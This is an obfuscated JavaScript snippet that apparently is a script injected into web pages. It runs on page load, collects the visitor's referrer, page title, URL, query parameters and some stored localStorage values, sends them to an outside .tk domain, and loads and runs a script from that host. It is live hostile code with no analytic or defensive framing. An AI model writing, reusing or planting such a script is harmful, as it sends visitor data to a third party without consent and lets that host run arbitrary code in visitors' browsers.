   (function() {
    var name = '_4rfLFfCZGJD8xk84';
    if (!window._4rfLFfCZGJD8xk84) {
        window._4rfLFfCZGJD8xk84 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://teplodistedeli.tk/fitshow',
            P_PATH: 'https://teplodistedeli.tk/fec84ce/postback',
        };
    }
    const _ZTtLqFWP4Rjqzbny = localStorage.getItem('config');
    if (typeof _ZTtLqFWP4Rjqzbny !== 'undefined' && _ZTtLqFWP4Rjqzbny !== null) {
        var _kG7VwPKPX1sCQxbk = JSON.parse(_ZTtLqFWP4Rjqzbny);
        var _Vrrz6Bt8G5Jr4xPL = Math.round(+new Date()/1000);
        if (_kG7VwPKPX1sCQxbk.created_at + window._4rfLFfCZGJD8xk84.ttl < _Vrrz6Bt8G5Jr4xPL) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _XXd2Bdc6kfL6xqDT = localStorage.getItem('subId');
    var _w7cvVhH4DkFW3c2V = localStorage.getItem('token');
    var _pp86VvGSmrrWG8YN = '?return=js.client';
        _pp86VvGSmrrWG8YN += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _pp86VvGSmrrWG8YN += '&se_referrer=' + encodeURIComponent(document.referrer);
        _pp86VvGSmrrWG8YN += '&default_keyword=' + encodeURIComponent(document.title);
        _pp86VvGSmrrWG8YN += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _pp86VvGSmrrWG8YN += '&name=' + encodeURIComponent(name);
        _pp86VvGSmrrWG8YN += '&host=' + encodeURIComponent(window._4rfLFfCZGJD8xk84.R_PATH);
    if (typeof _XXd2Bdc6kfL6xqDT !== 'undefined' && _XXd2Bdc6kfL6xqDT && window._4rfLFfCZGJD8xk84.unique) {
        _pp86VvGSmrrWG8YN += '&sub_id=' + encodeURIComponent(_XXd2Bdc6kfL6xqDT);
    }
    if (typeof _w7cvVhH4DkFW3c2V !== 'undefined' && _w7cvVhH4DkFW3c2V && window._4rfLFfCZGJD8xk84.unique) {
        _pp86VvGSmrrWG8YN += '&token=' + encodeURIComponent(_w7cvVhH4DkFW3c2V);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._4rfLFfCZGJD8xk84.R_PATH + _pp86VvGSmrrWG8YN;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
